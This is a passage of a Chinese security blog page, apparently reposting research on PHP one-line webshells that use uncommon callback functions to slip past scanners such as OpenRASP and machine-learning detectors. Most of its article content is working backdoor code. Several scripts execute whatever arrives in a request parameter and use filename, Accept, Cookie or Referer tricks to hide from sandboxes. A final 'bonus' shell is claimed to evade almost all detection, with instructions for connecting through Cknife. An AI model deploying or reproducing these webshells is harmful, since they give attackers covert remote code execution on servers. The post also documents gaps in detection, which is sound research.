class="string">"y"</span> =&gt; <span class="string">"18"</span>, <span class="string">"z"</span> =&gt; <span class="string">"1b"</span>,</span><br><span class="line">    <span class="string">"A"</span> =&gt; <span class="string">"20"</span>, <span class="string">"B"</span> =&gt; <span class="string">"23"</span>, <span class="string">"C"</span> =&gt; <span class="string">"22"</span>, <span class="string">"D"</span> =&gt; <span class="string">"25"</span>, <span class="string">"E"</span> =&gt; <span class="string">"24"</span>, <span class="string">"F"</span> =&gt; <span class="string">"27"</span>, <span class="string">"G"</span> =&gt; <span class="string">"26"</span>, <span class="string">"H"</span> =&gt; <span class="string">"29"</span>, <span class="string">"I"</span> =&gt; <span class="string">"28"</span>,</span><br><span class="line">    <span class="string">"J"</span> =&gt; <span class="string">"2b"</span>, <span class="string">"K"</span> =&gt; <span class="string">"2a"</span>, <span class="string">"L"</span> =&gt; <span class="string">"2d"</span>, <span class="string">"M"</span> =&gt; <span class="string">"2c"</span>, <span class="string">"N"</span> =&gt; <span class="string">"2f"</span>, <span class="string">"O"</span> =&gt; <span class="string">"2e"</span>, <span class="string">"P"</span> =&gt; <span class="string">"31"</span>, <span class="string">"Q"</span> =&gt; <span class="string">"30"</span>, <span class="string">"R"</span> =&gt; <span class="string">"33"</span>,</span><br><span class="line">    <span class="string">"S"</span> =&gt; <span class="string">"32"</span>, <span class="string">"T"</span> =&gt; <span class="string">"35"</span>, <span class="string">"U"</span> =&gt; <span class="string">"34"</span>, <span class="string">"V"</span> =&gt; <span class="string">"37"</span>, <span class="string">"W"</span> =&gt; <span class="string">"36"</span>, <span class="string">"X"</span> =&gt; <span class="string">"39"</span>, <span class="string">"Y"</span> =&gt; <span class="string">"38"</span>, <span class="string">"Z"</span> =&gt; <span class="string">"3b"</span>,</span><br><span class="line">);</span><br><span class="line">$f = pack(<span class="string">"H*"</span>, $trick[$key].<span class="string">"3f120b1655"</span>) ^ $key.<span class="string">"Land!"</span>;</span><br><span class="line">array_intersect_uassoc (<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就如下图所示，会被查杀：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgvrri0j30qk04tq35.jpg" alt="OpenRASP在线查杀"></p>
+<p>将脚本命名为<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/array_intersect_uassoc-filename-last-char-must-be-r.php" target="_blank" rel="noopener">array_intersect_uassoc-r.php</a>, 硬编码脚本最后一位字符为”r”，就不会被平台检测到，证明了我们原始的想法和对平台检测原理的部分推测:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$key = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>);</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; =  $key.<span class="string">"Land!"</span>;</span><br><span class="line">$f = pack(<span class="string">"H*"</span>, <span class="string">"13"</span>.<span class="string">"3f120b1655"</span>) ^ $LandGrey;</span><br><span class="line">array_intersect_uassoc (<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><h4 id="利用检测平台的信息缺失"><a href="#利用检测平台的信息缺失" class="headerlink" title="利用检测平台的信息缺失"></a>利用检测平台的信息缺失</h4></li>
+</ol>
+<p>接着猜想：当脚本在沙盒中运行时，如果得不到可以让脚本正常执行的关键信息，平台就无法查杀Webshell；而我们连接时，带上关键信息，就可以正常使用一句话木马后门，从而绕过查杀。</p>
+<p>例如，利用下面的一句话<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/array_intersect_uassoc-headers-accept-r.php" target="_blank" rel="noopener">array_intersect_uassoc-headers-accept-r.php</a>，请求时，Cknife携带请求头<code>Accept: r</code>，密码输入”LandGrey”，即可成功连接一句话木马：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgzz8o8j30cf06edfs.jpg" alt="Cknife"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$key = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>);</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; = $_SERVER[<span class="string">"HTTP_ACCEPT"</span>].<span class="string">"Land!"</span>;</span><br><span class="line">$f = pack(<span class="string">"H*"</span>, <span class="string">"13"</span>.<span class="string">"3f120b1655"</span>) ^ $LandGrey;</span><br><span class="line">array_intersect_uassoc(<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gheth2gz8ij30kl04t74f.jpg" alt="OpenRASP在线查杀"></p>
+<ol start="3">
+<li><h4 id="其它信息的差异"><a href="#其它信息的差异" class="headerlink" title="其它信息的差异"></a>其它信息的差异</h4></li>
+</ol>
+<p>在针对某个特别的目标测试时，可以利用目标的特殊信息构造信息的差异，实现Webshell绕过。</p>
+<p>如目标IP地址的唯一性、域名、特殊Cookie、Session字段和值、$_SERVER变量中可被控制的值，甚至是主机Web服务的根目录、操作系统等一些差别，发挥空间很大。</p>
+<h2 id="0x06：绕过深度学习技术的检测"><a href="#0x06：绕过深度学习技术的检测" class="headerlink" title="0x06：绕过深度学习技术的检测"></a>0x06：绕过深度学习技术的检测</h2><p>当用0x05 “<strong>1. 利用重命名前后的脚本名不同</strong>“中的脚本来测试时，被深度学习模型技术检测Webshell给查杀了。</p>
+<p>但是基于免杀的回调函数，利用0x05给出的”<strong>2. 利用检测平台的信息缺失</strong>“给出的一句话，仍然可以突破 webshell.cdxy.me平台的Webshell检测:</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gheth58rl6j30m80cswf5.jpg" alt="OpenRASP在线查杀"></p>
+<p>为了避免偶然，换个免杀函数，再测试一次。请求时设置Cookie值为<code>Cookie: set-domain-name=ass;</code>，以下示例脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/array_intersect_ukey-cookie-ass.php" target="_blank" rel="noopener">array_intersect_ukey-cookie-ass.php</a>代码也可绕过该平台的查杀，当然，以上提到的其它工具和平台也可以绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Noticed: (PHP 5 &gt;= 5.4.0, PHP 7)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$ch = $_COOKIE[<span class="string">"set-domain-name"</span>];</span><br><span class="line">array_intersect_ukey(<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="number">1</span>), <span class="keyword">array</span>(<span class="number">1</span>), $ch.<span class="string">"ert"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>在测试期间，还对河马机器学习查杀引擎  <a href="http://ml.shellpub.com" target="_blank" rel="noopener">http://ml.shellpub.com</a> 进行过测试，发现突破不了。测试中，发现连下面的正常语句都会被杀：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以就将Wordpress的源码上传，测试下系统的可用性。1774个文件，发现了1494个疑似后门。系统的测试结果不能作为判断标准，所以正文中略过了对该平台的测试。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gheth8vpnhj30rd0fsaaw.jpg" alt="机器学习在线查杀"></p>
+<h2 id="0x07-彩蛋"><a href="#0x07-彩蛋" class="headerlink" title="0x07: 彩蛋"></a>0x07: 彩蛋</h2><p>最后再给出一个可以绕过当前市面上几乎所有Webshell查杀的PHP一句话木马脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/forward_static_call_array-referer-ass.php" target="_blank" rel="noopener">forward_static_call_array-referer-ass.php</a>。请求时，设置Referer头，后面以”ass****”结尾即可,比如：<code>Referer: http://www.target.com/ass.php</code>。</p>
+<p>在使用Cknife时，注意软件实现有缺陷，会从第二个”:”处截断，可改成<code>Referer: http%3a//www.target.com/ass.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Noticed: (PHP 5 &gt;= 5.3.0, PHP 7)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$wx = substr($_SERVER[<span class="string">"HTTP_REFERER"</span>],<span class="number">-7</span>,<span class="number">-4</span>);</span><br><span class="line">forward_static_call_array($wx.<span class="string">"ert"</span>, <span class="keyword">array</span>($_REQUEST[$password]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-后记"><a href="#0x08-后记" class="headerlink" title="0x08: 后记"></a>0x08: 后记</h2><p>文章的”<strong>0x04: 绕过传统检测</strong>“研究结果表明：对于基于<strong>陌生的回调函数后门</strong>构造的一句话后门<strong>脚本本身</strong>，传统的基于特征、正则表达式和黑名单制的查杀技术，已经失去了对抗PHP Webshell检测的意义。</p>
+<p>“<strong>0x05: 突破OpenRASP WebShell沙盒检测</strong>“、”<strong>0x06: 绕过深度学习技术的检测</strong>“和”<strong>小插曲</strong>“部分的研究结果表名：新型的沙盒技术、深度学习、机器学习查杀平台还不够成熟和稳定，虽然在<strong>检测未知的一句话木马方面表现领先于传统检测方式</strong>，但是经过研究，还是可以构造出绕过查杀的PHP一句话木马脚本。</p>
+<p>文章以上研究都是对PHP一句话<strong>木马脚本本身</strong>的免杀研究。文章发布后，以上多个回调函数后门估计很快会被加入黑名单。</p>
+<p>要注意对于实际应用中，脚本本身免杀只是第一步，WAF和查杀软件可能会根据脚本的创建日期、文件大小、通信流量特征等多个方面，动态、综合的判断脚本是否为恶意Webshell，本文并未涉及。</p>
+<h2 id="0x09-参考文档"><a href="#0x09-参考文档" class="headerlink" title="0x09: 参考文档"></a>0x09: 参考文档</h2><p><a href="http://php.net/manual" target="_blank" rel="noopener">http://php.net/manual</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
+<p><a href="https://joychou.org/web/webshell.html" target="_blank" rel="noopener">https://joychou.org/web/webshell.html</a></p>
+<p><a href="http://www.likesec.com/2017/12/08/webshell/" target="_blank" rel="noopener">http://www.likesec.com/2017/12/08/webshell/</a></p>
+<p><a href="http://blog.safedog.cn/?p=68" target="_blank" rel="noopener">http://blog.safedog.cn/?p=68</a></p>
+<p><a href="http://www.freebuf.com/articles/web/155891.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/155891.html</a></p>
+<p><a href="http://www.freebuf.com/articles/web/9396.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/9396.html</a></p>
+<p><a href="https://blog.csdn.net/xysoul/article/details/49791993" target="_blank" rel="noopener">https://blog.csdn.net/xysoul/article/details/49791993</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1097506" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1097506</a></p>
+<p><a href="http://www.91ri.org/12824.html" target="_blank" rel="noopener">http://www.91ri.org/12824.html</a></p>
+<p><a href="http://www.3years.cc/index.php/archives/18/" target="_blank" rel="noopener">http://www.3years.cc/index.php/archives/18/</a></p>
+<p><a href="http://www.cnblogs.com/LittleHann/p/3522990.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/3522990.html</a></p>
+<p><a href="https://habrahabr.ru/post/215139/" target="_blank" rel="noopener">https://habrahabr.ru/post/215139/</a></p>
+<p><a href="https://stackoverflow.com/questions/14674834/php-convert-string-to-hex-and-hex-to-string" target="_blank" rel="noopener">https://stackoverflow.com/questions/14674834/php-convert-string-to-hex-and-hex-to-string</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持技术分享，你的支持鼓励我！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/Wechat.jpeg" alt="alin 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zfb.jpeg" alt="alin 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/08/04/china-chopper/" rel="next" title="编码混淆wehshell">
+                <i class="fa fa-chevron-left"></i> 编码混淆wehshell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/08/04/spring-webshell/" rel="prev" title="基于内存webshell">
+                基于内存webshell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/mao.jpeg"
+                alt="alin" />
+            
+              <p class="site-author-name" itemprop="name">alin</p>
+              <p class="site-description motion-element" itemprop="description">走出菜鸟阵营</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00: 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01：Webshell后门"><span class="nav-number">2.</span> <span class="nav-text">0x01：Webshell后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02：查杀现状研究"><span class="nav-number">3.</span> <span class="nav-text">0x02：查杀现状研究</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03：查找可做后门的回调函数"><span class="nav-number">4.</span> <span class="nav-text">0x03：查找可做后门的回调函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#关键词一：callable"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">关键词一：callable</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关键词二：mixed-options"><span class="nav-number">4.0.0.2.</span> <span class="nav-text">关键词二：mixed $options</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关键词三：handler"><span class="nav-number">4.0.0.3.</span> <span class="nav-text">关键词三：handler</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关键词四：callback"><span class="nav-number">4.0.0.4.</span> <span class="nav-text">关键词四：callback</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关键词五：invoke"><span class="nav-number">4.0.0.5.</span> <span class="nav-text">关键词五：invoke</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04：绕过传统检测"><span class="nav-number">5.</span> <span class="nav-text">0x04：绕过传统检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05：突破OpenRASP-WebShell沙盒检测"><span class="nav-number">6.</span> <span class="nav-text">0x05：突破OpenRASP WebShell沙盒检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用重命名前后的脚本名不同"><span class="nav-number">6.0.1.</span> <span class="nav-text">利用重命名前后的脚本名不同</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用检测平台的信息缺失"><span class="nav-number">6.0.2.</span> <span class="nav-text">利用检测平台的信息缺失</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其它信息的差异"><span class="nav-number">6.0.3.</span> <span class="nav-text">其它信息的差异</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06：绕过深度学习技术的检测"><span class="nav-number">7.</span> <span class="nav-text">0x06：绕过深度学习技术的检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小插曲"><span class="nav-number">8.</span> <span class="nav-text">小插曲</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-彩蛋"><span class="nav-number">9.</span> <span class="nav-text">0x07: 彩蛋</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-后记"><span class="nav-number">10.</span> <span class="nav-text">0x08: 后记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-参考文档"><span class="nav-number">11.</span> <span class="nav-text">0x09: 参考文档</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">alin</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
